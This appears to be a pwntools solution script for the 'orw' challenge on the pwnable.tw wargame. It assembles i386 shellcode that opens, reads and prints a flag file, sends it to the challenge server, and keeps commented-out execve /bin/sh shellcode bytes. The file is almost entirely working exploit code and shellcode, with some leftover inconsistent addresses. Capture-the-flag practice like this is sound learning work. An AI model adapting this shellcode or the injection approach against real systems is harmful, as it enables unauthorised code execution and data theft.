#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context(arch='i386', os='linux')
context.log_level = 'debug'

shellcode_bss = 0x0804A060

# sys open (eax 5, ebx char* filename, ecx int flags, edx int mode) => fd(eax)
SYSCALL_OPEN = asm('mov eax, 5; mov ebx, 0x0804a095; mov ecx, 0; int 80')
# sys read (eax 3, ebx int fd, ecx char* buf, edx size_t count)
SYSCALL_READ = asm('mov ebx, eax; mov eax, 3; mov ecx, 0x804a220; mov edx, 0x100; int 80')
# sys write (eax 4, ebx int fd, ecx char* buf, edx size_t size)
SYSCALL_WRITE = asm('mov eax, 4; mov ebx, 1; mov edx, 0x100; int 80')

shellcode = \
'''
mov eax, 5; mov ebx, 0x804a095; mov ecx, 0; int 0x80;
mov ebx, eax; mov eax, 3; mov ecx, 0x0804a0a4; mov edx, 100; int 0x80;
mov eax, 4; mov ebx, 1; mov edx, 100; int 0x80;
'''

filename = b'/home/orw/flag\x00'

print repr(SYSCALL_OPEN)
print repr(SYSCALL_READ)
print repr(SYSCALL_WRITE)
# l = len(SYSCALL_OPEN + SYSCALL_READ + SYSCALL_WRITE + filename)
# buf_addr = shellcode_bss + l

# log.debug('buf_addr = %s', hex(buf_addr))

filename_addr = 0x0804a095
buf_addr = 0x0804a0a4

shellcode = asm(shellcode)

print  shellcode

l = len(shellcode)

filename_addr = shellcode_bss + l
print hex(filename_addr)

shellcode = shellcode + filename

print shellcode

# SHELLCODE = SYSCALL_OPEN + SYSCALL_READ + SYSCALL_WRITE + filename
# SHELLCODE = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

# SHELLCODE = asm(shellcraft.sh())

def to_pwn():
    io = remote('chall.pwnable.tw', 10001)
    # io = remote('139.162.123.119', 10001)
    io.sendafter(':', shellcode)
    data = io.recv(100)
    log.success(data)
    # io.interactive()


if __name__ == '__main__':
    to_pwn()
    # pass
